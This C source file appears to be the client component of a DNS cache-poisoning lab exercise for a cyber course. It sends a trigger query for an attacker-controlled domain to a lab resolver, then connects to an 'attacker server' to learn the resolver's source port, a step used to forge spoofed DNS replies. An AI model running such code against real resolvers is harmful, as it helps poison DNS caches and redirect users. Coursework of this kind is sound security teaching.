
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ldns/ldns.h>

#define RESOLVER_IP "192.168.1.203"
#define RESOLVER_DNS_PORT 53
#define ATTACKER_SER_IP "192.168.1.201"

void send_first_request(void) {
    ldns_rdf *name = NULL;
    ldns_pkt *query = NULL;
    uint8_t *wire = NULL;
    size_t wire_size = 0;
    ldns_status status;

    printf("Building ldns query..\n");

    name = ldns_dname_new_frm_str("www.attacker.cybercourse.example.com");
    if (!name) {
        printf("name failed");
        exit(1);
    }

    query = ldns_pkt_query_new(name, LDNS_RR_TYPE_A, LDNS_RR_CLASS_IN, LDNS_RD);
    if (!query) {
        printf("query failed..");
        exit(1);
    }

    status = ldns_pkt2wire(&wire, query, &wire_size);
    if (status != LDNS_STATUS_OK) {
            printf("status failed..");
        exit(1);
    }

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed..");
        exit(1);
    }

    struct sockaddr_in resolver = {0};
    resolver.sin_family = AF_INET;
    resolver.sin_port = htons(RESOLVER_DNS_PORT);
    inet_pton(AF_INET, RESOLVER_IP, &resolver.sin_addr);

    printf("[CLIENT] Sending trigger DNS query ->resolver (%s:53)...\n", RESOLVER_IP);
    if (sendto(udp_sockfd, wire, wire_size, 0, (struct sockaddr*)&resolver, sizeof(resolver)) < 0) {
        printf("send to failed..");
        exit(1);
    }

    close(udp_sockfd);
    free(wire);

    printf("[CLIENT] Trigger DNS query sent successfully");
}

int main(void) {
    // DNS request to the resolver->attacker domain
    send_first_request();

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in srv = {0};
    srv.sin_family = AF_INET;
    srv.sin_port = htons(12345);
    inet_pton(AF_INET, ATTACKER_SER_IP, &srv.sin_addr);

    if (connect(sockfd, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        printf("connect failed..");
        exit(1);
    }
    int resolver_port;
    recv(sockfd, &resolver_port, sizeof(resolver_port), 0);

    printf("Client received: %d\n", resolver_port);

    close(sockfd);
    return 0;
}